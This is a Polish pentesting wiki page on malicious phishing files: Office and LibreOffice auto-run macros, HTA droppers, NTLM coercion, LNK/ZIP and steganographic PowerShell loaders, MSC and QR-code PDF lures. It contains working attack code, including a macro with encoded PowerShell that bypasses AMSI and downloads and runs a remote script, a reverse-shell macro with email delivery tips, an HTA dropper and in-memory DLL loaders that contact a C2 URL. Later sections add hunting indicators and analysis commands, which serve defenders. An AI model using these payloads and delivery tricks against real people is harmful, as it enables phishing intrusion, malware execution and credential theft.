# Pliki phishingowe i dokumenty

{{#include ../../banners/hacktricks-training.md}}

## Dokumenty Office

Microsoft Word przeprowadza walidację danych pliku przed jego otwarciem. Walidacja danych polega na identyfikacji struktury danych zgodnie ze standardem OfficeOpenXML. Jeśli podczas identyfikacji struktury danych wystąpi błąd, analizowany plik nie zostanie otwarty.

Zazwyczaj pliki Word zawierające makra mają rozszerzenie `.docm`. Można jednak zmienić nazwę pliku, zmieniając jego rozszerzenie, a mimo to zachować możliwość wykonywania makr.\
Na przykład plik RTF z założenia nie obsługuje makr, ale plik DOCM ze zmienionym rozszerzeniem na RTF zostanie obsłużony przez Microsoft Word i będzie mógł wykonywać makra.\
Te same mechanizmy i rozwiązania wewnętrzne dotyczą wszystkich programów z pakietu Microsoft Office (Excel, PowerPoint itd.).

Możesz użyć następującego polecenia, aby sprawdzić, które rozszerzenia będą obsługiwane przez niektóre programy Office:

```bash
assoc | findstr /i "word excel powerp"
```

Pliki DOCX odwołujące się do zdalnego szablonu (Plik – Opcje – Dodatki – Zarządzaj: Szablony – Przejdź), który zawiera makra, również mogą „uruchamiać” makra.

### Zewnętrzne ładowanie obrazu

Przejdź do: _Wstawianie --> Szybkie części --> Pole_\
_**Kategorie**: Łącza i odwołania, **Nazwy pól**: includePicture, i **Nazwa pliku lub URL**:_ http://<ip>/whatever

![Dokumenty Office - Zewnętrzne ładowanie obrazu: Przejdź do: Wstawianie -- Szybkie części -- Pole](<../../images/image (155).png>)

### Backdoor w makrach

Makra można wykorzystać do uruchamiania dowolnego kodu z dokumentu.

#### Funkcje autoload

Im są powszechniejsze, tym większe prawdopodobieństwo, że wykryje je AV.

- AutoOpen()
- Document_Open()

#### Przykłady kodu makr

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Ręczne usuwanie metadanych

Przejdź do **Plik > Informacje > Inspekcja dokumentu > Inspekcja dokumentu**, aby otworzyć Inspektora dokumentów. Kliknij **Inspekcja**, a następnie **Usuń wszystko** obok **Właściwości dokumentu i informacje osobiste**.

#### Rozszerzenie dokumentu

Po zakończeniu wybierz menu rozwijane **Zapisz jako typ** i zmień format z **`.docx`** na Word 97-2003 **`.doc`**.\
Zrób to, ponieważ **nie można zapisać makr w pliku `.docx`**, a rozszerzenie **`.docm` z obsługą makr ma złą reputację** (np. ikona miniatury ma duży znak `!`, a niektóre bramy internetowe/pocztowe całkowicie je blokują). Dlatego **starsze rozszerzenie `.doc` to najlepszy kompromis**.

#### Generatory złośliwych makr

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Makra LibreOffice ODT uruchamiane automatycznie (Basic)

Dokumenty LibreOffice Writer mogą zawierać makra Basic, które uruchamiają się automatycznie po otwarciu pliku, jeśli makro zostanie przypisane do zdarzenia **Otwórz dokument** (Narzędzia → Dostosuj → Zdarzenia → Otwórz dokument → Makro…).<sup>[[1]](#references)</sup> Proste makro reverse shell wygląda tak:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Zwróć uwagę na podwójne cudzysłowy (`""`) wewnątrz ciągu znaków — LibreOffice Basic używa ich do escapowania dosłownych cudzysłowów, dlatego payloady kończące się na `...==""")` mają poprawnie sparowane zarówno polecenie wewnętrzne, jak i argument `Shell`.

Wskazówki dotyczące dostarczenia:

- Zapisz plik jako `.odt` i przypisz makro do zdarzenia dokumentu, aby uruchamiało się natychmiast po otwarciu.
- Wysyłając wiadomość e-mail za pomocą `swaks`, użyj `--attach @resume.odt` (`@` jest wymagane, aby jako załącznik wysłać bajty pliku, a nie ciąg znaków z nazwą pliku). Ma to kluczowe znaczenie przy nadużywaniu serwerów SMTP, które akceptują dowolnych odbiorców `RCPT TO` bez weryfikacji.

## Pliki HTA

HTA to program Windows, który **łączy HTML i języki skryptowe (takie jak VBScript i JScript)**. Generuje interfejs użytkownika i działa jako aplikacja „w pełni zaufana”, bez ograniczeń modelu bezpieczeństwa przeglądarki.

HTA jest uruchamiany za pomocą **`mshta.exe`**, który jest zwykle **instalowany** wraz z **Internet Explorerem**, co sprawia, że `mshta` jest zależny od IE. Jeśli więc zostanie on odinstalowany, pliki HTA nie będą mogły się uruchomić.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Wymuszanie uwierzytelniania NTLM

Istnieje kilka sposobów na **zdalne wymuszenie uwierzytelniania NTLM**. Można na przykład dodać **niewidoczne obrazy** do wiadomości e-mail lub kodu HTML, który użytkownik otworzy (nawet podczas HTTP MitM?). Można też wysłać ofierze **adres plików**, które **wywołają** **uwierzytelnianie** już przy **otwarciu folderu**.

**Więcej pomysłów znajdziesz na poniższych stronach:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Pamiętaj, że możesz nie tylko wykraść hash lub dane uwierzytelniające, ale także **przeprowadzać ataki NTLM relay**:

- [**Ataki NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay do certyfikatów)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## Loadery LNK + payloady osadzone w ZIP (łańcuch bezplikowy)

Bardzo skuteczne kampanie dostarczają archiwum ZIP zawierające dwa legalnie wyglądające dokumenty-przynęty (PDF/DOCX) oraz złośliwy plik .lnk. Sztuczka polega na tym, że właściwy loader PowerShell jest zapisany w surowych bajtach ZIP-a, za unikalnym znacznikiem, a plik .lnk wyodrębnia go i uruchamia w całości w pamięci.<sup>[[2]](#references)</sup>

Typowy przebieg działania zaimplementowany w jednolinijkowym skrypcie PowerShell uruchamianym przez plik .lnk:

1) Znajdź oryginalny plik ZIP w typowych lokalizacjach: Desktop, Downloads, Documents, %TEMP%, %ProgramData% oraz katalogu nadrzędnym bieżącego katalogu roboczego.
2) Odczytaj bajty ZIP-a i znajdź zakodowany na stałe znacznik (np. xFIQCV). Wszystko za znacznikiem to osadzony payload PowerShell.
3) Skopiuj ZIP-a do %ProgramData%, rozpakuj go tam i otwórz dokument-przynętę .docx, aby całość wyglądała wiarygodnie.
4) Omiń AMSI dla bieżącego procesu: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Usuń obfuskację z kolejnego etapu (np. usuń wszystkie znaki #) i uruchom go w pamięci.

Przykładowy szkielet PowerShell do wyodrębnienia i uruchomienia osadzonego etapu:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Notatki
- Dostarczanie często wykorzystuje subdomeny renomowanych usług PaaS (np. *.herokuapp.com) i może ograniczać dostęp do payloadów (serwować nieszkodliwe pliki ZIP na podstawie adresu IP/UA).
- Kolejny etap często odszyfrowuje shellcode zakodowany w base64/XOR i wykonuje go za pomocą Reflection.Emit + VirtualAlloc, aby ograniczyć ślady na dysku.

Persistence wykorzystywana w tym samym łańcuchu
- Przejęcie COM TypeLib kontrolki Microsoft Web Browser sprawia, że IE/Explorer lub dowolna aplikacja, która ją osadza, automatycznie ponownie uruchamia payload.<sup>[[2]](#references)[[4]](#references)</sup> Szczegóły i gotowe do użycia polecenia znajdziesz tutaj:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- Pliki ZIP zawierające dołączony do danych archiwum ciąg ASCII będący znacznikiem (np. xFIQCV).
- Plik .lnk, który przeszukuje foldery nadrzędne/użytkownika, aby znaleźć plik ZIP, a następnie otwiera dokument-przynętę.
- Manipulowanie AMSI za pomocą [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Długie wątki biznesowe kończące się linkami hostowanymi w zaufanych domenach PaaS.

## Etapowanie z przynętą .lnk otwieraną jako pierwszą → persistence przez zaplanowane zadanie → side-loading zaufanego CPL

Kolejny powtarzający się schemat wykorzystuje **plik `.lnk` podszywający się pod dokument**, który natychmiast otwiera nieszkodliwą przynętę, a w tle przygotowuje właściwy łańcuch.<sup>[[3]](#references)</sup>

Zaobserwowany przebieg:
1. Skrót **podszywa się pod plik PDF** i używa `conhost.exe` lub podobnego proxy do uruchomienia zaciemnionego downloadera PowerShell.
2. PowerShell rozdziela oczywiste tokeny (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), przez co proste detekcje szukające `iwr`, `gci`, `ren`, `cpi` lub `schtasks` nie wykrywają polecenia.
3. Stager najpierw pobiera **dokument-przynętę**, otwiera go dla ofiary, a następnie odtwarza złośliwe pliki w tle.
4. Payloady mogą być zapisywane z **nietypowymi rozszerzeniami**, a następnie przemianowywane przez usunięcie znaków wypełniających, co opóźnia pojawienie się oczywistych artefaktów `.exe` / `.cpl`.
5. Persistence jest ustanawiane za pomocą **zaplanowanego zadania uruchamianego co minutę**, które uruchamia zaufany plik binarny hosta ze ścieżki zapisywalnej przez użytkownika.

Podstawowe wskazówki do huntingu dla tego schematu:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Przydatny układ plików, który warto rozpoznawać:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` lub `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Dlaczego drugi etap jest podstępny

W analizie przypadku Rapid7 zaplanowane zadanie wielokrotnie uruchamiało **`Fondue.exe`** z `C:\Users\Public\`. Ponieważ plik **`APPWIZ.cpl`** znajdował się w tym samym katalogu i eksportował funkcję **`RunFODW`**, zaufany plik binarny Microsoftu ładował bocznie plik CPL atakującego zamiast legalnej kopii systemowej.

Plik CPL:
- Odczytuje blob **AES-256-CBC** z `C:\Windows\Tasks\editor.dat`
- Odszyfrowuje go za pomocą **Windows CNG / `bcrypt.dll`**
- Przydziela pamięć wykonywalną i kopiuje do niej odszyfrowany shellcode
- Uruchamia go pośrednio, przekazując wskaźnik do shellcode jako callback funkcji **`EnumUILanguagesW`**

Ostatni krok warto wyszukiwać osobno: malware często unika bezpośredniego skoku `((void(*)())buf)()` i zamiast tego nadużywa **legalnego WinAPI przyjmującego callback**, aby przekazać sterowanie.

Odszyfrowanym payloadem w tej kampanii był shellcode **Donut**, który następnie mapował końcowy plik PE w całości w pamięci i łatał **AMSI/WLDP/ETW** w bieżącym procesie, zanim przekazał mu sterowanie. Więcej informacji o side-loadingu i przetwarzaniu końcowym w pamięci znajdziesz tutaj:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktyczne punkty do wyszukiwania:
- Plik `.lnk` uruchamiający `powershell.exe` lub `conhost.exe`, po czym wyświetlany jest dokument-przynęta.
- Krótkotrwałe pobrania do **`C:\Users\Public\`**, po których natychmiast następuje zmiana nazw plików z bezsensownymi rozszerzeniami.
- Zaplanowane zadania o niewyróżniających się nazwach, takich jak `GoogleErrorReport`, uruchamiane z **katalogów zapisywalnych przez użytkownika**.
- Zaufane pliki binarne ładujące pliki **`.cpl` / `.dll`** z tego samego katalogu spoza katalogów systemowych.
- Bloby tekstu Base64 zapisywane w **`C:\Windows\Tasks\`**, a następnie odczytywane przez moduł załadowany bocznie.

## Payloady ukryte w obrazach i rozdzielone znacznikami steganograficznymi (stager PowerShell)

Najnowsze łańcuchy loaderów dostarczają zaciemniony JavaScript/VBS, który dekoduje i uruchamia stager PowerShell w Base64. Stager pobiera obraz (często GIF) zawierający ukrytą jako zwykły tekst bibliotekę DLL .NET zakodowaną w Base64, umieszczoną między unikatowymi znacznikami początku i końca. Skrypt wyszukuje te znaczniki (przykłady zaobserwowane w środowisku rzeczywistym: «<<sudo_png>> … <<sudo_odt>>>»), wyodrębnia tekst znajdujący się między nimi, dekoduje go z Base64 do bajtów, ładuje zestaw w pamięci i wywołuje znaną metodę wejściową, przekazując jej URL C2.<sup>[[5]](#references)</sup>

Przebieg
- Etap 1: Archiwizowany dropper JS/VBS → dekoduje osadzony Base64 → uruchamia stager PowerShell z parametrami -nop -w hidden -ep bypass.
- Etap 2: Stager PowerShell → pobiera obraz, wyodrębnia Base64 ujęty w znaczniki, ładuje bibliotekę DLL .NET w pamięci i wywołuje jej metodę (np. VAI), przekazując URL C2 i opcje.
- Etap 3: Loader pobiera końcowy payload i zazwyczaj wstrzykuje go przez process hollowing do zaufanego pliku binarnego (często MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Więcej informacji o process hollowing i uruchamianiu przez proxy zaufanych narzędzi znajdziesz tutaj:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Przykład PowerShell wyodrębniający bibliotekę DLL z obrazu i wywołujący metodę .NET w pamięci:

<details>
<summary>Ekstraktor payloadu stego i loader PowerShell</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Uwagi
- Jest to ATT&CK T1027.003 (steganografia/ukrywanie znaczników).<sup>[[6]](#references)</sup> Znaczniki różnią się między kampaniami.
- Obejścia AMSI/ETW i deobfuskacja ciągów znaków są często stosowane przed załadowaniem assembly.
- Wykrywanie: skanuj pobrane obrazy w poszukiwaniu znanych delimiterów; identyfikuj przypadki, w których PowerShell uzyskuje dostęp do obrazów i natychmiast dekoduje bloki Base64.

Zobacz też narzędzia stego i techniki carvingu:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → staging Base64 PowerShell

Często spotykanym pierwszym etapem jest niewielki, mocno obfuskowany plik `.js` lub `.vbs` dostarczony w archiwum. Jego jedynym celem jest zdekodowanie osadzonego ciągu Base64 i uruchomienie PowerShell z parametrami `-nop -w hidden -ep bypass`, aby pobrać kolejny etap przez HTTPS.<sup>[[5]](#references)</sup>

Szkielet logiki (w ujęciu abstrakcyjnym):
- Odczytaj zawartość własnego pliku
- Znajdź blok Base64 między ciągami śmieciowymi
- Zdekoduj do postaci skryptu PowerShell w kodowaniu ASCII
- Wykonaj za pomocą `wscript.exe`/`cscript.exe`, wywołując `powershell.exe`

Wskazówki do wykrywania
- Załączniki JS/VBS w archiwach uruchamiające `powershell.exe` z `-enc`/`FromBase64String` w wierszu poleceń.
- `wscript.exe` uruchamiający `powershell.exe -nop -w hidden` ze ścieżek tymczasowych użytkownika.

## Dokumenty MSC jako kontenery wykonywania kodu (GrimResource)

Pliki Microsoft Management Console (`.msc`) to definicje konsoli w formacie XML, zwykle otwierane przez `mmc.exe`. **GrimResource** wykorzystuje odwołanie `StringTable` do zasobu `apds.dll` zawierającego starą podatność typu XSS, przez co otwarcie spreparowanej konsoli przez użytkownika powoduje uruchomienie JavaScriptu wewnątrz `mmc.exe`. Zaobserwowane próbki łączyły obfuskację opartą na `transformNode` z **DotNetToJScript**, aby utworzyć payload .NET bez typowej ścieżki makr Office.<sup>[[9]](#references)</sup>

Podczas wstępnej analizy statycznej traktuj niezaufany plik MSC jako tekst i **nie klikaj go dwukrotnie**:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Silnymi wskaźnikami w czasie działania są sytuacje, gdy `mmc.exe` ładuje CLR lub komponenty skryptowe, nawiązuje połączenia sieciowe albo uruchamia `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` lub nieoczekiwany plik wykonywalny. Ten format jest legalny, dlatego detekcje powinny korelować **pochodzenie + podejrzaną zawartość XML/skryptu + zachowanie `mmc.exe`**, zamiast blokować wszystkie pliki MSC.<sup>[[9]](#references)</sup>

## PDF-y/QR-y przekierowujące i selektywne dostarczanie payloadu

PDF nie musi wykorzystywać exploita, aby być przydatny. W niedawnych kampaniach w dokumentach wyglądających na nieszkodliwe umieszczano **kod QR lub zwykły link**, przenoszono sesję przeglądarki poza kontrolę poczty i personalizowano adres docelowy adresem odbiorcy. Microsoft udokumentował w 2025 roku pliki PDF z adresami URL kodów QR unikalnymi dla każdego odbiorcy, prowadzącymi do infrastruktury wykradającej dane logowania RaccoonO365; w równoległym łańcuchu stosowano filtrowanie na podstawie adresu IP/środowiska, aby wybranym odwiedzającym zwracać ścieżkę JavaScript/MSI, a skanerom lub niedozwolonym klientom — nieszkodliwy plik PDF.<sup>[[10]](#references)</sup>

Podczas analizy sprawdzaj zarówno akcje PDF, jak i wyrenderowane kody QR. Kod QR może być narysowany wektorowo, a nie zapisany jako obraz możliwy do wyodrębnienia, dlatego rasteryzuj każdą stronę i wyodrębniaj osadzone obrazy:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Sprawdzaj zdekodowane adresy docelowe i przekierowania z odizolowanego systemu analitycznego, nie uwierzytelniając się. Przydatne cechy do threat huntingu to m.in. pliki PDF zawierające wyłącznie kody QR i niemal puste treści wiadomości e-mail, adres e-mail odbiorcy osadzony w parametrze zapytania, kilka przekierowań przez renomowane usługi hostingowe oraz różna treść zwracana w zależności od adresu IP, geolokalizacji, plików cookie, referrera lub user agenta. Porównuj żądania w kontrolowanych konfiguracjach, ponieważ pojedyncze pobranie z sandboxa może zwrócić jedynie przynętę.<sup>[[10]](#references)</sup>

## Pliki Windows służące do wykradania hashy NTLM

Zobacz stronę o **miejscach, z których można wykradać dane logowania NTLM**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – Makro LibreOffice → webshell IIS → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Kampania ZipLine: zaawansowany atak phishingowy wymierzony w amerykańskie firmy](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: śledzenie taktyk Dropping Elephant w łańcuchu loaderów nawiązującym do Chin](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Przejęcie TypeLib – nowa technika persistence COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – Loader PhantomVAI dostarcza różne infostealery](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganografia (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Wykorzystanie zaufanych narzędzi deweloperskich jako proxy do wykonania: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console do uzyskiwania początkowego dostępu i unikania wykrycia](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Aktorzy zagrożeń wykorzystują sezon podatkowy do przeprowadzania kampanii phishingowych o tematyce podatkowej](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
